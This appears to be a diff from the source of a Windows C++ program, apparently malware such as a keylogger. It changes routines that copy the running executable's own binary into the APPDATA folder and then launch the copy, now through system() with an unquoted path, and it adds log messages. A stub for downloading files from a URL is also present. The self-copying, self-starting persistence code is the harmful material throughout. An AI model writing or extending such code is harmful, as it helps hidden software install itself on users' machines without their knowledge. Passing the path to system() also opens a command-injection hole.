@@ -85,14 +85,14 @@ namespace IO
         std::string FileName = PathFindFileName(csPath.c_str());
         return FileName;
     }
-    bool copy(std::string path,std::string filename){
+    bool copy(std::string path_filename){
 
         //get self name
         std::string cur_path_filename = getFileNameWithPath();
         //open self
         std::ifstream initialFile(cur_path_filename, std::ios::in|std::ios::binary);
         //open outfile
-        std::ofstream outputFile(path+filename, std::ios::out|std::ios::binary);
+        std::ofstream outputFile(path_filename, std::ios::out|std::ios::binary);
         //read pointer to end binary
         initialFile.seekg(0, std::ios::end);
         //set fileSize call buffer
@@ -141,37 +141,21 @@ namespace IO
 
     bool download_File(const char * urlfile,const char * despath)
     {
-
+        return false;
     }
     inline bool exists_file (const std::string& name) {
         struct stat buffer;
         return (stat (name.c_str(), &buffer) == 0);
     }
     void startup(LPCTSTR lpApplicationName) {
-        // additional information
-        STARTUPINFO si;
-        PROCESS_INFORMATION pi;
-
-        // set the size of the structures
-        ZeroMemory(&si, sizeof(si));
-        si.cb = sizeof(si);
-        ZeroMemory(&pi, sizeof(pi));
-
-        // start the program up
-        CreateProcess(lpApplicationName,   // the path
-                      "2",        // Command line
-                      NULL,           // Process handle not inheritable
-                      NULL,           // Thread handle not inheritable
-                      FALSE,          // Set handle inheritance to FALSE
-                      0,              // No creation flags
-                      NULL,           // Use parent's environment block
-                      NULL,           // Use parent's starting directory
-                      &si,            // Pointer to STARTUPINFO structure
-                      &pi             // Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
-        );
-        // Close process and thread handles.
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
+        int result = system(lpApplicationName);
+        if (result <0){
+            std::string msg = "[ ERROR ] Start"+std::string(lpApplicationName);
+            Helper::WriteAppLog(msg);
+        } else{
+            std::string msg = "Start" +std::string(lpApplicationName);
+            Helper::WriteAppLog(msg);
+        }
     }
     bool copy_File() {
         char* appdata = getenv("APPDATA");
@@ -201,14 +185,20 @@ namespace IO
 
                     return false;
                 }else {
+                    std::string msg = "COMPLETE" +std::string(fullpath);
+                    Helper::WriteAppLog(msg);
                     startup(fullpath.c_str());
                     return true;
                 }
             }else {
+                std::string msg = "COMPLETE"+std::string(fullpath);
+                Helper::WriteAppLog(msg);
                 startup(fullpath.c_str());
                 return true;
             }
         }else {
+            std::string msg = "COMPLETE" +std::string(fullpath);
+            Helper::WriteAppLog(msg);
             startup(fullpath.c_str());
             return true;
         }
